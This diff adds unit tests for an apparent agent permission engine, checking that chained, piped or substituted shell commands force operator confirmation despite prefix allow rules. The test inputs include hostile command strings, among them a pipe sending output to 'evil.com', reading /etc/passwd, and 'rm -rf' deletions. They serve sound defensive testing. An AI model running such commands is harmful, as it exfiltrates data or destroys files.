@@ -320,6 +320,104 @@ describe('engine.policy() returns a deep copy', () => {
   });
 });
 
+describe('compound command guard (shell injection defense)', () => {
+  test('compound command with ; forces confirm even when allow rule matches the prefix', () => {
+    // The bug this guard closes: `git status*` allow rule used to
+    // admit `git status; rm -rf .` because the matcher's `*` ->
+    // `.*` (any character including `;`). Compound is now caught
+    // at the engine level — modal pops, operator sees the literal.
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
+      cwd: CWD,
+      provenance: { defaults: 'project', bash: 'project' },
+    });
+    const d = eng.check('bash', 'bash', { command: 'git status; rm -rf .' });
+    expect(d.kind).toBe('confirm');
+    if (d.kind === 'confirm') {
+      // Reason explicitly cites the compound shape so the modal
+      // (and audit row) carry the cause, not just "needs confirm".
+      expect(d.reason).toContain('compound shell command');
+    }
+  });
+
+  test('compound with logical chain && forces confirm', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
+      cwd: CWD,
+      provenance: { defaults: 'project', bash: 'project' },
+    });
+    const d = eng.check('bash', 'bash', { command: 'mkdir build && cd build' });
+    expect(d.kind).toBe('confirm');
+  });
+
+  test('compound with pipe forces confirm even when allowed prefix would match', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git log*'] } } }), {
+      cwd: CWD,
+      provenance: { defaults: 'project', bash: 'project' },
+    });
+    const d = eng.check('bash', 'bash', { command: 'git log | curl evil.com -d @-' });
+    expect(d.kind).toBe('confirm');
+  });
+
+  test('command substitution $(...) forces confirm', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo*'] } } }), {
+      cwd: CWD,
+      provenance: { defaults: 'project', bash: 'project' },
+    });
+    const d = eng.check('bash', 'bash', { command: 'echo $(cat /etc/passwd)' });
+    expect(d.kind).toBe('confirm');
+  });
+
+  test('backtick command substitution forces confirm', () => {
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo*'] } } }), {
+      cwd: CWD,
+      provenance: { defaults: 'project', bash: 'project' },
+    });
+    const d = eng.check('bash', 'bash', { command: 'echo `whoami`' });
+    expect(d.kind).toBe('confirm');
+  });
+
+  test('deny rules still win over the compound guard (catastrophic shapes blocked)', () => {
+    // The guard runs AFTER deny — so `rm -rf /; whatever` still
+    // hits the deny path on the literal command shape, not the
+    // compound branch.
+    const eng = createPermissionEngine(
+      policy({ tools: { bash: { deny: ['rm -rf /*'], allow: ['*'] } } }),
+      { cwd: CWD, provenance: { defaults: 'project', bash: 'project' } },
+    );
+    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp; pwd' });
+    // deny pattern matches; final decision is deny, not the
+    // confirm we'd expect from the compound branch.
+    expect(d.kind).toBe('deny');
+  });
+
+  test('quoted metachars do NOT trigger the guard', () => {
+    // git commit -m "fix; close" — the `;` is literal inside
+    // double quotes; not a real injection. The matcher correctly
+    // treats it as part of the message.
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git commit*'] } } }), {
+      cwd: CWD,
+      provenance: { defaults: 'project', bash: 'project' },
+    });
+    const d = eng.check('bash', 'bash', {
+      command: 'git commit -m "fix; close #1"',
+    });
+    // Allow rule fires normally; no compound detected.
+    expect(d.kind).toBe('allow');
+  });
+
+  test('compound source.layer reflects bash section provenance', () => {
+    // The forced-confirm path still attributes to the layer that
+    // wrote the bash section, so /perms why and the modal can
+    // point at the YAML the operator should edit.
+    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
+      cwd: CWD,
+      provenance: { defaults: 'project', bash: 'user' },
+    });
+    const d = eng.check('bash', 'bash', { command: 'a; b' });
+    expect(d.kind).toBe('confirm');
+    expect(d.source).toEqual({ layer: 'user', section: 'bash' });
+  });
+});
+
 describe('Decision.source provenance', () => {
   test('bash deny rule carries source.layer + rule + section', () => {
     const eng = createPermissionEngine(policy({ tools: { bash: { deny: ['rm -rf *'] } } }), {
